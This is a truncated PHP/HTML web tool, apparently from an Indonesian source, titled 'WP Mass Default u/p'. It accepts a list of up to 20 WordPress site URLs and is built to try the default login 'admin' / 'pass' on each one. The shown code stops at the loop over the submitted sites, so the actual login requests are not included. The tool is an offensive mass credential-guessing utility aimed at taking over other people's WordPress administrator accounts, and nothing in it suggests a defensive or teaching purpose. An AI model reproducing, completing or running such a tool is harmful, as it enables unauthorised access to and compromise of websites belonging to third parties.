<html>
<head>
<title>[+] WP Mass Default u/p [+]</title>
...
<body>
<center>
<font face=courier new size=5>Wordpress Mass Default u/p<br><font size="3">Mass Wordpress Dengan Menggunakan Default u/p<br>User : <font color=yellow>admin</font> & Pass : <font color=yellow>pass</font><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="http://wordpress.com/
http://wordpress.com/wp-login.php" required="true"></textarea><br><br>
...
if (isset($_POST['go'])) {
  ...
  if (count(explode("\r\n", $webs)) > 20) {
    die("[+] Maksimal total 20 website per submit !");
  }
  foreach (explode("\r\n", $webs) as $web) {
